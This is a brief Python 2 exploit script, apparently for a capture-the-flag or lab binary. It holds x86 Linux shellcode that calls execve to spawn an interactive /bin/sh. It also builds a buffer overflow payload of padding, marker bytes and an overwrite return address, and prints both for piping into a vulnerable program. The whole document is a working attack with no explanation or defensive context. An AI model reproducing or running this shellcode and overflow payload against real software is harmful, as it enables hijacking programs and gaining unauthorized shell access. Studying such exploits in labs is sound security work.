#!/usr/bin/env python

shell = "\x31\xC0\xF7\xE9\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x68\x2D\x69\x69\x69\x89\xE6\x50\x56\x53\x89\xE1\xB0\x0B\xCD\x80"
payload = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>>>>>>>>>>>>>>>>>>>>>>>>>>>><<<<<<<<<<<<<<<<<<<<<<<<<<<<<AABBBBCCCCDDDDEEEEFFFFGGGG>>>>><<<<<AA\xd9\x8a\x04\x08"

print shell+payload
